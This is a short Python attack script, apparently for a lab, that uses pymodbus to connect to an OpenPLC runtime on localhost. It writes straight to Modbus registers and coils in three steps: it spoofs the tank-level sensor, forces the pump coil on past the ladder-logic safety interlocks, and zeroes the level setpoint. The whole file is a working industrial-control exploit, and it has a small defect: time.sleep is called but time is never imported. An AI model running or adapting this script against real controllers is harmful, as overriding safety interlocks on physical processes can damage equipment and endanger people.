                                                                                      
from pymodbus.client import ModbusTcpClient

# Target: Localhost OpenPLC runtime
TARGET_IP = '127.0.0.1'
TARGET_PORT = 502

client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)

if not client.connect():
    print(f"[-] Connection failed to {TARGET_IP}:{TARGET_PORT}")
    exit(1)

print("[!] CONNECTED: Initiating unauthorized Modbus injection...\n")

# Attack 1: Sensor Spoofing / Register Manipulation
# Overwrite TANK_LEVEL (%MW0 / Holding Register 0) to 100%
print("[*] Attack 1: Spoofing water level sensor -> Setting TANK_LEVEL to 100%...")
client.write_register(address=0, value=100)
time.sleep(1)

# Attack 2: Safety Interlock Override / Unauthorized Coil Injection
# Force PUMP_CMD (%QX0.0 / Coil 0) to TRUE directly, bypassing ladder interlocks
print("[*] Attack 2: Bypassing controller safety interlocks -> Forcing PUMP_CMD ON...")
client.write_coil(address=0, value=True)
time.sleep(1)

# Attack 3: Setpoint Tampering
# Zero out LEVEL_SETPOINT (%MW1 / Holding Register 1) to disrupt standard logic
print("[*] Attack 3: Overwriting operational parameters -> Setting LEVEL_SETPOINT to 0...")
client.write_register(address=1, value=0)

print("\n[!] Exploit sequence completed. Target state altered.")
client.close()
